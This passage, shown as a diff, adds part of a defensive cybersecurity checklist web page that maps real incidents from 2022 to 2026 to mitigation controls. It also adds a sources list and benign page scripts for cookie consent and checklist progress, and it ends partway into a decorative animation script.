+          <span class="item-body">Canada's Centre for Cyber Security (Oct. 2025) warned that hacktivists were routinely finding unpatched, default-credentialed PLCs and HMIs exposed directly to the internet — this is Section 4 of this checklist; if you haven't done that section yet, start there.</span>
+        <span class="item-extra"><b>Plain language</b>If your plant equipment is reachable from the internet with a default password, assume it's already been found — check today.</span><span class="item-extra"><b>Example</b>Search Shodan for your own company name or IP range to see what an attacker would find about your exposed equipment right now.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-8"><label for="c9-8">
+          <span class="item-title">Russia-attributed takeover of a dam's control systems</span>
+          <span class="item-body">Norway formally attributed an April 2025 intrusion at a dam in Bremanger to Russia, saying hackers briefly seized control of the facility itself, not just IT systems around it — confirm OT control systems require a physical or out-of-band step to change state, so a network compromise alone can't move a valve or gate.</span>
+        <span class="item-extra"><b>Plain language</b>Critical machinery should require more than a remote login to actually change what it's doing.</span><span class="item-extra"><b>Example</b>A dam gate control that needs a physical badge swipe at the control panel in addition to the network command to actually move.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-8b"><label for="c9-8b">
+          <span class="item-title">China-linked group maintaining persistent access inside every major telecom in a country</span>
+          <span class="item-body">Singapore's Cyber Security Agency confirmed a China-linked group (Feb. 2026) had breached all four of the country's major telecom providers using zero-days and rootkits — U.S. telecom, healthcare, and utility operators should assume the same playbook is being run against domestic targets and hunt for it proactively rather than waiting for a breach notification.</span>
+        <span class="item-extra"><b>Plain language</b>Assume attackers are already quietly inside somewhere and go looking for them, instead of waiting for an alert.</span><span class="item-extra"><b>Example</b>Hire a threat-hunting team once a year to actively search your telecom or utility network for signs of dormant access, not just react to alarms.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-9"><label for="c9-9">
+          <span class="item-title">Power grid reconnaissance via corrupted lateral-movement tooling</span>
+          <span class="item-body">Suspected state-linked hackers compromised a national power grid (Sep. 2023) by corrupting a trusted Windows application to move laterally — confirm application allow-listing is enforced on OT-adjacent engineering workstations.</span>
+        <span class="item-extra"><b>Plain language</b>Only let approved, signed software run on machines that control industrial equipment.</span><span class="item-extra"><b>Example</b>Enable Windows AppLocker or WDAC on SCADA engineering workstations so an unapproved .exe simply can't execute, even if it's copied onto the machine.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-10"><label for="c9-10">
+          <span class="item-title">Rail-signal system hijacked over unauthenticated radio frequencies</span>
+          <span class="item-body">Hacktivists briefly seized Poland's railway signaling frequencies (Aug. 2022) to halt trains — a reminder that OT risk isn't only IP-network based; audit RF and legacy signaling protocols too.</span>
+        <span class="item-extra"><b>Plain language</b>Don't assume old radio-based control systems are safe just because they're not on the internet.</span><span class="item-extra"><b>Example</b>Audit which of your plant systems still rely on unencrypted radio frequency commands, and add authentication to the receiver side where possible.</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Identity, Credentials &amp; Helpdesk Abuse</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-11"><label for="c9-11">
+          <span class="item-title">Stolen credentials against a national bank-account registry</span>
+          <span class="item-body">France's Ministry of Economy (Feb. 2026) confirmed a hacker used stolen credentials alone — no exploit — to access 1.2 million bank account records. Credential-stuffing defenses matter as much as patch management.</span>
+        <span class="item-extra"><b>Plain language</b>A stolen password alone shouldn't be enough to reach sensitive financial records — add a second check.</span><span class="item-extra"><b>Example</b>Require a hardware security key (not just a password) to access any system holding customer bank account numbers.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-12"><label for="c9-12">
+          <span class="item-title">Sensitive registry exposed by an unauthorized minor with basic access</span>
+          <span class="item-body">France's national secure-credentials agency ANTS (Apr. 2026) was breached by an unsophisticated actor exposing up to 18 million accounts — a reminder that access control failures don't require nation-state skill to cause nation-scale damage.</span>
+        <span class="item-extra"><b>Plain language</b>Assume a low-skill attacker with a stolen password is just as dangerous as a sophisticated one — the damage doesn't care about skill level.</span><span class="item-extra"><b>Example</b>Rate-limit and alert on login attempts to sensitive registries, so 50 failed logins in a minute gets noticed regardless of who's behind it.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-13"><label for="c9-13">
+          <span class="item-title">Password-spray against a legacy non-production tenant</span>
+          <span class="item-body">A major tech vendor's corporate email (Jan. 2024) was breached via password-spraying an old test tenant lacking MFA — this is the exact scenario covered in Section 5; audit every legacy tenant, not just production.</span>
+        <span class="item-extra"><b>Plain language</b>Old test accounts are often exempt from your security rules by accident — go find them and fix that.</span><span class="item-extra"><b>Example</b>Search your identity provider for any account with 'test,' 'demo,' or 'temp' in the name and confirm every one has MFA enabled.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-14"><label for="c9-14">
+          <span class="item-title">OAuth token abuse across hundreds of connected SaaS tenants</span>
+          <span class="item-body">Attackers used stolen OAuth refresh tokens from a sales-engagement integration (Sep. 2025) to pull CRM data from hundreds of downstream companies — audit which third-party OAuth grants your org has approved and revoke anything unused.</span>
+        <span class="item-extra"><b>Plain language</b>Regularly review which outside apps have permission to access your company data, and remove ones you don't recognize.</span><span class="item-extra"><b>Example</b>Check your Google Workspace or Microsoft 365 'connected apps' list quarterly and revoke anything nobody remembers approving.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-15"><label for="c9-15">
+          <span class="item-title">Compromised admin account used to reset thousands of device credentials at once</span>
+          <span class="item-body">A medical device manufacturer's corporate systems (Mar. 2026) were hit hard enough to trigger factor resets across 200,000+ corporate devices worldwide — confirm your identity provider has rate-limiting and anomaly alerts on bulk credential-reset operations.</span>
+        <span class="item-extra"><b>Plain language</b>Make sure a single compromised admin account can't reset thousands of devices' credentials in one shot.</span><span class="item-extra"><b>Example</b>Add an approval step or rate limit so a bulk credential-reset action requires two people to sign off, not one click by one compromised account.</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Supply Chain &amp; Third-Party / SaaS</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-16"><label for="c9-16">
+          <span class="item-title">A single compromised EdTech vendor exposing hundreds of millions of records</span>
+          <span class="item-body">A learning-management-system provider (May 2026) had cloud infrastructure compromised, exposing data tied to roughly 275 million users across thousands of institutions — evaluate the blast radius of every vendor holding bulk student, patient, or customer PII, not just your own systems.</span>
+        <span class="item-extra"><b>Plain language</b>Before handing a vendor your customers' data, ask what happens to that data if the vendor itself gets breached.</span><span class="item-extra"><b>Example</b>Ask any SaaS vendor holding student, patient, or customer data: 'do you encrypt at rest, and what's your breach-notification SLA?' — get it in writing.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-17"><label for="c9-17">
+          <span class="item-title">Regional reseller/partner breach exposing a global platform's users</span>
+          <span class="item-body">A cloud gaming platform's regional Alliance partner (May 2026) was compromised, not the platform's core infrastructure — confirm contractual security requirements extend to every regional reseller or partner with access to your user data.</span>
+        <span class="item-extra"><b>Plain language</b>Your global brand is only as secure as the smallest regional partner reselling it.</span><span class="item-extra"><b>Example</b>Require every regional partner or reseller to pass the same security review as your core vendors, not a lighter one because they're 'just a partner.'</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-18"><label for="c9-18">
+          <span class="item-title">Third-party vendor breach reaching a federal agency's internal files</span>
+          <span class="item-body">A national treasury department (Dec. 2024) had 3,000+ internal files exposed through a third-party vendor compromise, not a direct breach — vendor risk assessments need to include what the vendor itself can reach inside your network.</span>
+        <span class="item-extra"><b>Plain language</b>A vendor with access to your network can be the way in, even if your own systems are solid.</span><span class="item-extra"><b>Example</b>Ask: 'if this vendor's remote-support tool gets compromised, what could an attacker reach inside our network through it?' — then limit that.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-19"><label for="c9-19">
+          <span class="item-title">Software supply-chain attack chained from a previous supply-chain attack</span>
+          <span class="item-body">A VoIP desktop app (2023) was compromised via a vulnerability that had itself been injected during an earlier supply-chain compromise — build SBOM (software bill of materials) review into vendor onboarding, not just at time of an incident.</span>
+        <span class="item-extra"><b>Plain language</b>Know what's actually inside the software you rely on, all the way down to its dependencies.</span><span class="item-extra"><b>Example</b>Keep a software bill of materials (SBOM) for critical apps so, when a library like XZ Utils has a scare, you can check exposure in minutes, not days.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-20"><label for="c9-20">
+          <span class="item-title">Confidential design/vendor files exfiltrated and used for ransom leverage</span>
+          <span class="item-body">A major electronics manufacturer's supplier (June 2026) had confidential files tied to downstream brand partners stolen and used for ransom demands — confirm NDAs with suppliers include mandatory breach-notification SLAs, and test that they're actually honored.</span>
+        <span class="item-extra"><b>Plain language</b>Contracts with suppliers should require them to tell you quickly if they're breached — and you should actually check they do.</span><span class="item-extra"><b>Example</b>Add a clause requiring supplier breach notification within 72 hours, and test it once by asking a supplier to walk through their process.</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Cloud &amp; Data-Broker Exposure</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-21"><label for="c9-21">
+          <span class="item-title">Cross-referenced financial rating data compromised at an industry clearinghouse</span>
+          <span class="item-body">A U.S. insurance-industry data clearinghouse (June 2026) had credit-rating data compromised, forcing multiple ratings agencies to pause data-sharing — map which of your critical business processes depend on a single shared industry data broker.</span>
+        <span class="item-extra"><b>Plain language</b>If your business depends on one shared industry data source, know what happens to your operations if that source goes down.</span><span class="item-extra"><b>Example</b>Map which business processes stop working if your shared industry data feed (ratings, credit checks, etc.) is unavailable for a week.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-22"><label for="c9-22">
+          <span class="item-title">Health-insurance breach exposing nearly half a national population</span>
+          <span class="item-body">A breach of French health insurers (Feb. 2024) exposed birth date, national ID, and marital-status data for ~33 million people — confirm PII field-level encryption, not just database-level access control, on anything holding national ID numbers.</span>
+        <span class="item-extra"><b>Plain language</b>Highly sensitive identifiers like national ID or SSN need extra protection beyond normal database access control.</span><span class="item-extra"><b>Example</b>Encrypt Social Security numbers at the field level in your database, so even a full database dump doesn't hand them over in plain text.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-23"><label for="c9-23">
+          <span class="item-title">Telecom breach exposing hundreds of terabytes including background-check data</span>
+          <span class="item-body">A Canadian telecom (Mar. 2026) had a claimed 700TB of data including background-check records and source code stolen — confirm data-loss-prevention tooling is watching for bulk outbound transfer, not just endpoint malware.</span>
+        <span class="item-extra"><b>Plain language</b>Watch for large amounts of data leaving your network at once — that's often the actual breach, not the initial hack.</span><span class="item-extra"><b>Example</b>Set a DLP alert for any single transfer over 5GB to an external destination, so a bulk data exfiltration event gets flagged immediately.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-24"><label for="c9-24">
+          <span class="item-title">Luxury retail customer data stolen via credential-stuffing and scraping tools</span>
+          <span class="item-body">Several luxury fashion brands under one parent company (Sep. 2025) had client data stolen through automated credential-stuffing and scraping — confirm bot-mitigation and rate-limiting sit in front of customer account portals, not just the login form.</span>
+        <span class="item-extra"><b>Plain language</b>Slow down automated bots trying thousands of stolen password combinations against your login page.</span><span class="item-extra"><b>Example</b>Add rate-limiting and CAPTCHA after 5 failed login attempts from the same IP to blunt credential-stuffing tools.</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Aviation, Logistics &amp; Physical-World Disruption</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-25"><label for="c9-25">
+          <span class="item-title">Airport check-in platform ransomware cascading across multiple countries</span>
+          <span class="item-body">A shared airport operations platform (Sep. 2025) was hit with ransomware, forcing manual check-in across three major European airports simultaneously — confirm shared operational platforms serving multiple sites have independent-failure fallback procedures rehearsed at each site.</span>
+        <span class="item-extra"><b>Plain language</b>If multiple locations depend on one shared platform, each location needs its own fallback plan, not just a shared one.</span><span class="item-extra"><b>Example</b>Every airport counter should have a manual boarding-pass and paper-manifest process it can switch to within 15 minutes if the shared system goes down.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-26"><label for="c9-26">
+          <span class="item-title">National postal and banking services knocked offline by DDoS during peak season</span>
+          <span class="item-body">A national postal and banking service (Dec. 2025) was taken offline by DDoS right before a major holiday — confirm DDoS mitigation capacity is scaled for known seasonal traffic peaks, not average-day baselines.</span>
+        <span class="item-extra"><b>Plain language</b>Make sure your defenses can handle a surge in bad traffic at your busiest, most predictable time of year.</span><span class="item-extra"><b>Example</b>Test your DDoS mitigation capacity against 3x your normal holiday-season traffic, not just an average Tuesday.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-27"><label for="c9-27">
+          <span class="item-title">Automaker IT ransomware halting production across multiple plants</span>
+          <span class="item-body">A major automaker's IT network (Sep. 2025) was hit with ransomware that disrupted manufacturing and retail operations across multiple plants, becoming one of the most economically damaging incidents on record for that country — confirm manufacturing execution systems are segmented from corporate IT, not bridged for convenience.</span>
+        <span class="item-extra"><b>Plain language</b>Keep the factory floor's control systems on a separate network from corporate email and file shares.</span><span class="item-extra"><b>Example</b>A ransomware infection that starts with a phishing email in HR should not be able to reach the assembly line's control network at all.</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Nation-State Espionage &amp; Zero-Days</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-28"><label for="c9-28">
+          <span class="item-title">Months-long espionage across every major telecom provider in a country</span>
+          <span class="item-body">A state-linked group breached all four major telecom providers in one country (Feb. 2026) using zero-days and rootkits over several months — confirm your logging retention window is long enough to reconstruct a multi-month dwell-time intrusion, not just a multi-week one.</span>
+        <span class="item-extra"><b>Plain language</b>Long, quiet intrusions need long log retention to catch — make sure you're not only keeping 30 days of logs.</span><span class="item-extra"><b>Example</b>Retain security logs for at least 12 months so a months-long stealthy intrusion can still be reconstructed after the fact.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-29"><label for="c9-29">
+          <span class="item-title">Zero-day chain in mobile device management software reaching government agencies</span>
+          <span class="item-body">Zero-days in a widely used endpoint management platform (Feb. 2026) reached both a national government and a supranational body — confirm your MDM/EMM platform vendor has a published, tested patch-SLA for critical vulnerabilities.</span>
+        <span class="item-extra"><b>Plain language</b>Ask every vendor managing your phones and laptops what their patch turnaround time actually is, in writing.</span><span class="item-extra"><b>Example</b>Require your MDM vendor to commit to patching critical vulnerabilities within 72 hours of disclosure, and hold them to it.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-30"><label for="c9-30">
+          <span class="item-title">Espionage group maintaining silent access to government networks for years</span>
+          <span class="item-body">One espionage group maintained persistent access to two governments' networks for roughly eight years using custom implants — confirm threat-hunting exercises look for dormant, low-noise persistence mechanisms, not just active exfiltration.</span>
+        <span class="item-extra"><b>Plain language</b>Actively look for attackers who are already inside and being very quiet, instead of only watching for loud alarms.</span><span class="item-extra"><b>Example</b>Schedule quarterly 'assume breach' threat hunts that specifically search for low-and-slow persistence, not just obvious malware signatures.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-31"><label for="c9-31">
+          <span class="item-title">Cyber-espionage campaign using fake job offers as the initial lure</span>
+          <span class="item-body">A state-linked group targeted European defense firms (Oct. 2025) with fake job offers carrying a remote-access trojan — include fake-recruiter and fake-job-offer scenarios explicitly in security-awareness training, especially for engineering and defense-adjacent staff.</span>
+        <span class="item-extra"><b>Plain language</b>Teach employees — especially technical staff — that a great job offer can be a trap, not a compliment.</span><span class="item-extra"><b>Example</b>Include a real example in security training: 'a recruiter DMs you on LinkedIn with a generous offer and a suspicious attachment to review' — what do you do?</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Hacktivism, DDoS &amp; Information Operations</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-32"><label for="c9-32">
+          <span class="item-title">DDoS timed precisely to a political event or diplomatic meeting</span>
+          <span class="item-body">Multiple hacktivist DDoS campaigns in this timeline are timed to coincide with specific diplomatic meetings or political statements — if your organization is publicly linked to a contested political topic, plan for a DDoS capacity spike around your own announcement dates.</span>
+        <span class="item-extra"><b>Plain language</b>If your organization might become a political target, plan for extra attack traffic around your own big announcements.</span><span class="item-extra"><b>Example</b>Before a controversial public statement or policy announcement, put your DDoS provider on notice and increase monitoring for 48 hours.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-33"><label for="c9-33">
+          <span class="item-title">Compromised broadcast/notification system used to spread false emergency messages</span>
+          <span class="item-body">A prayer/utility app (Feb. 2026) was hacked to push unauthorized mass notifications during a live conflict — confirm your organization's mass-notification or push-alert system requires multi-party authorization before any message goes out to end users.</span>
+        <span class="item-extra"><b>Plain language</b>Nobody should be able to push a mass alert to your users or customers by themselves.</span><span class="item-extra"><b>Example</b>Require two authorized people to approve any mass push notification or emergency broadcast before it goes out, not a single admin's click.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-34"><label for="c9-34">
+          <span class="item-title">Residential IoT devices hijacked for reconnaissance during a physical attack</span>
+          <span class="item-body">Hackers hijacked residential webcams (Jan. 2024) to gather targeting information ahead of a physical strike — a reminder that consumer/residential IoT security has real physical-world stakes, not just a privacy angle.</span>
+        <span class="item-extra"><b>Plain language</b>Change default passwords on smart cameras and IoT devices — they're an easy way to watch a target without breaking into anything else.</span><span class="item-extra"><b>Example</b>Change the default admin password on every office or home security camera, and put them on a separate network from work devices.</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Financial &amp; Cryptocurrency</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-35"><label for="c9-35">
+          <span class="item-title">Third-party wallet software vulnerability enabling a billion-dollar theft</span>
+          <span class="item-body">A crypto exchange lost $1.5 billion in Ethereum (Feb. 2025) through a flaw in third-party wallet software during a routine fund transfer — treat every custody/transaction-signing dependency as in-scope for your own security review, even ones you didn't build.</span>
+        <span class="item-extra"><b>Plain language</b>If your business touches crypto custody, review every third-party piece of software involved in moving funds, not just your own code.</span><span class="item-extra"><b>Example</b>Require a third-party security audit of any wallet or bridge software before it's allowed to touch customer funds.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-36"><label for="c9-36">
+          <span class="item-title">Browser extension supply-chain compromise draining crypto wallets</span>
+          <span class="item-body">A wallet browser extension (Dec. 2025) was compromised via a leaked Web Store API key, pushing a malicious update that stole funds — rotate and vault CI/CD publishing credentials the same way you'd rotate a production database credential.</span>
+        <span class="item-extra"><b>Plain language</b>Treat the keys that let you publish software updates as seriously as a password to your bank account.</span><span class="item-extra"><b>Example</b>Store your Chrome Web Store or app-store publishing API key in a secrets vault with rotation, not in a plaintext CI/CD config file.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-37"><label for="c9-37">
+          <span class="item-title">State-linked actors funding weapons programs through repeat crypto theft</span>
+          <span class="item-body">State-linked actors have repeatedly targeted exchanges for large-scale theft used to fund weapons programs — if you operate in crypto, treat state-sponsored theft as a distinct threat model from ordinary cybercrime, with correspondingly stronger multi-party transaction approval.</span>
+        <span class="item-extra"><b>Plain language</b>If you operate in crypto, plan for patient, well-funded, state-backed attackers — not just opportunistic criminals.</span><span class="item-extra"><b>Example</b>Require two-person approval (multisig) for any transaction above a set dollar threshold, so one compromised key can't drain the treasury.</span></label>
+      </div>
+
+      <h3 style="color:var(--green-dim); font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; margin:26px 0 4px;">Insider &amp; Physical-Access Risk</h3>
+      <div class="check-item">
+        <input type="checkbox" id="c9-38"><label for="c9-38">
+          <span class="item-title">Sensitive espionage-related data leaked from a personal, unmanaged device</span>
+          <span class="item-body">A government agency's sensitive personnel data (July 2024) leaked after being transferred to a staffer's personal laptop, with no hack involved at all — confirm DLP policy covers data transfer to personal devices, not only network egress.</span>
+        <span class="item-extra"><b>Plain language</b>Sensitive data shouldn't be able to leave the company on someone's personal laptop without anyone noticing.</span><span class="item-extra"><b>Example</b>Configure DLP to flag any attempt to email or upload sensitive files to a personal, non-corporate device or cloud account.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c9-39"><label for="c9-39">
+          <span class="item-title">Physical tracking hardware planted on a senior official's own belongings</span>
+          <span class="item-body">A tracking chip was reportedly planted inside a senior military official's conference name tag — for high-value personnel, physical/supply-chain security of credentials and conference materials matters as much as digital security.</span>
+        <span class="item-extra"><b>Plain language</b>For high-value personnel, treat physical items like badges and conference materials as a security surface too.</span><span class="item-extra"><b>Example</b>Inspect conference gifts, name tags, and giveaway electronics given to executives before they're worn or used near sensitive facilities.</span></label>
+      </div>
+
+      <p style="margin-top:28px; font-size:0.85rem; color:var(--ink-dim);">This is a curated, paraphrased subset — the full CSIS timeline runs back to 2006 and is updated monthly. <a href="https://www.csis.org/programs/strategic-technologies-program/significant-cyber-incidents" target="_blank" rel="noopener">Read the complete list at csis.org ↗</a></p>
+    </section>
+
+    <!-- ============ SOURCES ============ -->
+    <section class="sources" id="sources">
+      <h2>Sources &amp; Further Reading</h2>
+      <div class="source-grid">
+        <div>
+          <h3>Government &amp; Federal</h3>
+          <ul>
+            <li><a href="https://www.cisa.gov/news-events/cybersecurity-advisories" target="_blank" rel="noopener">CISA Cybersecurity Advisories</a></li>
+            <li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" rel="noopener">CISA Known Exploited Vulnerabilities (KEV) Catalog</a></li>
+            <li>CISA Shields Ready &amp; Tabletop Exercise Packages (CTEPs)</li>
+            <li>EPA — America's Water Infrastructure Act (AWIA) Section 2013</li>
+            <li><a href="https://www.csis.org/programs/strategic-technologies-program/significant-cyber-incidents" target="_blank" rel="noopener">CSIS — Significant Cyber Incidents Timeline</a></li>
+          </ul>
+          <h3>Frameworks</h3>
+          <ul>
+            <li><a href="https://d3fend.mitre.org/" target="_blank" rel="noopener">MITRE D3FEND</a></li>
+            <li><a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&amp;CK</a></li>
+            <li><a href="https://www.nist.gov/cyberframework" target="_blank" rel="noopener">NIST Cybersecurity Framework 2.0</a></li>
+            <li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10 (Web &amp; LLM)</a></li>
+          </ul>
+        </div>
+        <div>
+          <h3>Open-Source Defensive Tooling</h3>
+          <ul>
+            <li><a href="https://wazuh.com/" target="_blank" rel="noopener">Wazuh — open-source XDR/SIEM</a></li>
+            <li><a href="https://suricata.io/" target="_blank" rel="noopener">Suricata — network threat detection</a></li>
+            <li><a href="https://github.com/zeek/zeek" target="_blank" rel="noopener">Zeek — network security monitoring</a></li>
+            <li><a href="https://www.open-scap.org/" target="_blank" rel="noopener">OpenSCAP — automated compliance auditing</a></li>
+            <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound — AD attack-path mapping</a></li>
+          </ul>
+          <h3>GTFOBins / LOLBAS</h3>
+          <ul>
+            <li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins — Unix binary abuse reference</a></li>
+            <li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS — Windows binary abuse reference</a></li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <div class="share-bar">
+      <span>Share this checklist:</span>
+      <a href="https://twitter.com/intent/tweet?text=A%20modern%2C%20source-linked%20penetration%20testing%20%26%20defense%20checklist&url=https://sauerninja.github.io/Penetration-Defense-Checklist/" target="_blank" rel="noopener" aria-label="Share on X/Twitter">
+        <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+      </a>
+      <a href="https://www.reddit.com/submit?url=https://sauerninja.github.io/Penetration-Defense-Checklist/&title=Penetration-Defense-Checklist" target="_blank" rel="noopener" aria-label="Share on Reddit">
+        <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.01 9.936c.696 0 1.26.564 1.26 1.26 0 .512-.307.95-.748 1.147.02.153.03.31.03.469 0 2.42-2.814 4.382-6.287 4.382-3.473 0-6.287-1.962-6.287-4.382 0-.16.01-.318.031-.473A1.258 1.258 0 015.73 11.196a1.26 1.26 0 011.937-1.06c.87-.63 2.077-1.033 3.42-1.09l.685-2.878a.31.31 0 01.335-.24l2.075.32c.14-.288.44-.487.79-.487a.87.87 0 010 1.74.868.868 0 01-.822-.596l-1.877-.29-.585 2.462c1.293.075 2.454.478 3.301 1.09a1.256 1.256 0 01.966-.45zM8.5 12.5a.9.9 0 100 1.8.9.9 0 000-1.8zm7 0a.9.9 0 100 1.8.9.9 0 000-1.8zm-5.68 3.185c-.13.13-.13.34 0 .47.828.83 2.35.892 2.85.892.5 0 2.022-.06 2.85-.892a.333.333 0 00-.47-.47c-.522.522-1.61.71-2.38.71-.77 0-1.858-.188-2.38-.71a.333.333 0 00-.47 0z"/></svg>
+      </a>
+      <a href="mailto:?subject=Penetration-Defense-Checklist&body=A%20modern%20defense%20checklist%20worth%20a%20look%3A%20https://sauerninja.github.io/Penetration-Defense-Checklist/" aria-label="Share via email">
+        <svg viewBox="0 0 24 24"><path d="M2 4h20v16H2V4zm2 2v.01L12 12l8-5.99V6H4zm16 2.24l-7.4 5.55a1 1 0 01-1.2 0L4 8.24V18h16V8.24z"/></svg>
+      </a>
+    </div>
+  </div>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    <p>This checklist is provided for defensive security education and organizational hardening. It does not include exploitation instructions, payloads, or offensive tooling — every item maps a known real-world attack pattern to its corresponding detection or mitigation control.</p>
+    <p><a href="https://github.com/SauerNinja/Penetration-Defense-Checklist">View source on GitHub</a> · <a href="LICENSE">MIT License</a></p>
+    <p class="byline">A research article based on thoughts by Setvin Noether (@SauerNinja)</p>
+  </div>
+</footer>
+
+<div id="cookie-banner" role="dialog" aria-live="polite">
+  <span>This site uses analytics cookies to understand readership.</span>
+  <button id="cookie-ok" type="button">OK</button>
+</div>
+
+<script>
+/* ---------- Cookie consent (single OK button, persists via localStorage) ---------- */
+(function(){
+  var banner = document.getElementById('cookie-banner');
+  var ok = document.getElementById('cookie-ok');
+  if(localStorage.getItem('pdc_cookie_ack') === '1'){
+    banner.style.display = 'none';
+  }
+  ok.addEventListener('click', function(){
+    localStorage.setItem('pdc_cookie_ack','1');
+    banner.style.display = 'none';
+    if(typeof gtag === 'function'){
+      gtag('consent', 'update', {
+        'ad_storage':'granted','ad_user_data':'granted','ad_personalization':'granted','analytics_storage':'granted'
+      });
+    }
+  });
+})();
+
+/* ---------- Reading progress bar ---------- */
+(function(){
+  var bar = document.getElementById('progress-bar');
+  function update(){
+    var h = document.documentElement;
+    var scrollTop = h.scrollTop || document.body.scrollTop;
+    var scrollHeight = (h.scrollHeight || document.body.scrollHeight) - h.clientHeight;
+    var pct = scrollHeight > 0 ? (scrollTop / scrollHeight) * 100 : 0;
+    bar.style.width = pct + '%';
+  }
+  document.addEventListener('scroll', update, {passive:true});
+  update();
+})();
+
+/* ---------- Checklist state (localStorage) + overall progress ---------- */
+(function(){
+  var boxes = Array.prototype.slice.call(document.querySelectorAll('.check-item input[type=checkbox]'));
+  var STORE_KEY = 'pdc_checklist_state_v1';
+
+  function loadState(){
+    try{ return JSON.parse(localStorage.getItem(STORE_KEY)) || {}; }catch(e){ return {}; }
+  }
+  function saveState(state){
+    localStorage.setItem(STORE_KEY, JSON.stringify(state));
+  }
+  function applyDoneClass(box){
+    var item = box.closest('.check-item');
+    if(box.checked){ item.classList.add('done'); } else { item.classList.remove('done'); }
+  }
+  function updateProgress(){
+    var total = boxes.length;
+    var done = boxes.filter(function(b){return b.checked;}).length;
+    document.getElementById('progress-count').textContent = done + ' / ' + total + ' complete';
+    var pct = total ? (done/total)*100 : 0;
+    document.getElementById('overall-bar-fill').style.width = pct + '%';
+  }
+
+  var state = loadState();
+  boxes.forEach(function(box){
+    if(state[box.id]){ box.checked = true; }
+    applyDoneClass(box);
+    box.addEventListener('change', function(){
+      var s = loadState();
+      s[box.id] = box.checked;
+      saveState(s);
+      applyDoneClass(box);
+      updateProgress();
+    });
+  });
+  updateProgress();
+
+  document.getElementById('reset-progress').addEventListener('click', function(){
+    if(!confirm('Reset checklist progress? This clears all checked items on this device.')) return;
+    localStorage.removeItem(STORE_KEY);
+    boxes.forEach(function(box){ box.checked = false; applyDoneClass(box); });
+    updateProgress();
+  });
+})();
+
+/* ---------- Matrix binary rain, encoding Amos 7:7-8 (KJV) in ASCII binary ---------- */
+(function(){
+  var canvas = document.getElementById('matrix-canvas');
+  if(!canvas) return;
+  var ctx = canvas.getContext('2d');
+  var dpr = Math.min(window.devicePixelRatio || 1, 2);
+
+  // ASCII-binary encoding of Amos 7:7-8, King James Version.
